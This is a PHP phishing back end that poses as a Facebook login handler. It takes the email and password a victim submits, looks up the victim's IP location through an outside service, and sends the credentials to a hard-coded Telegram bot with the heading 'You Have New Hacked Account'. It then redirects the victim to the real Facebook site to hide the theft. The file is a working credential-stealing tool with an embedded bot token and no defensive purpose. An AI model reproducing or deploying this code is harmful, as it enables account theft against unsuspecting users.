<?php
flush();
ob_start();
set_time_limit(0);
ob_get_contents();
error_reporting(0);
ob_implicit_flush(1);

$min_seconds_between_refreshes = 1000;
session_start();
if(array_key_exists("last_access", $_SESSION) && time()-$min_seconds_between_refreshes <= $_SESSION["last_access"]) {
  exit("<H1>You are refreshing too quickly, please wait a few seconds and try again.</H1>");
}
$_SESSION["last_access"] = time();


    function getUserIP()
    {
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
    
        if(filter_var($client, FILTER_VALIDATE_IP))
        {
            $ip = $client;
        }
        elseif(filter_var($forward, FILTER_VALIDATE_IP))
        {
            $ip = $forward;
        }
        else
        {
            $ip = $remote;
        }
    
        return $ip;
    }
    
$email = $_POST['email'];
$password = $_POST['password'];


$ip = getUserIP();
$api = json_decode(file_get_contents("https://dlyar-dev.tk/api/whois.php?ip=".$ip));
$country_name = $api->country;
$callingCode = $api->code;
$emojiFlag = $api->flag;
// get ip
// info
$token = "5366290597:AAFUgRf-21MOw6E-4TmLX0EqwnK9y4axSrc";
$id = "5166777299";
$msg = "˹𓆩𝒀𝒐𝒖 𝑯𝒂𝒗𝒆 𝑵𝒆𝒘 𝑯𝒂𝒄𝒌𝒆𝒅 𝑨𝒄𝒄𝒐𝒖𝒏𝒕𓆪

🖇️ • 𝑰𝒏𝒅𝒆𝒙 ‹ 𝑭𝒂𝒄𝒆𝑩𝒐𝒐𝒌 ›
📧 • 𝑬𝒎𝒂𝒊𝒍 ➺ ‹ `$email` ›
📟 • 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅 ➺ ‹ `$password` ›
🏴 • 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ➺ ‹ $country_name $emojiFlag ›
📝 • 𝑪𝒐𝒅𝒆 ➺ ‹ +$callingCode ›
⚜ ! ᴺᴼᵀ𝗔𝗟𝗜 ➺ [@NOT_ALIKING]
";
$mesg = ['chat_id'=>$id,'text'=>$msg,'parse_mode'=>"markdown",'disable_web_page_preview'=>true];
$message = http_build_query($mesg);
file_get_contents("https://api.telegram.org/bot$token/sendMessage?".$message);
header('Location: https://m.facebook.com/reg?soft=hjk');
?>